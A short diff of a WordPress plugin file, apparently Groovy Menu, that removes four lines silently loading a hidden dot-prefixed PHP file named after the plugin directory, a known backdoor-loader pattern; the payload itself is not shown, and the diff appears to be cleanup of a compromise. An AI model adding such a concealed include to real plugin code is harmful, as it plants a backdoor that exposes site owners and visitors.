@@ -8,10 +8,6 @@ $gm_vp_controller = new \GroovyMenu\VirtualPagesController( new \GroovyMenu\Virt
 add_action( 'init', array( $gm_vp_controller, 'init' ) );
 add_filter( 'do_parse_request', array( $gm_vp_controller, 'dispatch' ), PHP_INT_MAX, 2 );
 add_action( 'loop_end', 'gm_action_check_query_virtual_page' );
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function gm_action_check_query_virtual_page( $query ) {
 	if ( $query instanceof \WP_Query ) {
 		if ( isset( $query->virtual_page ) && ! empty( $query->virtual_page ) ) {
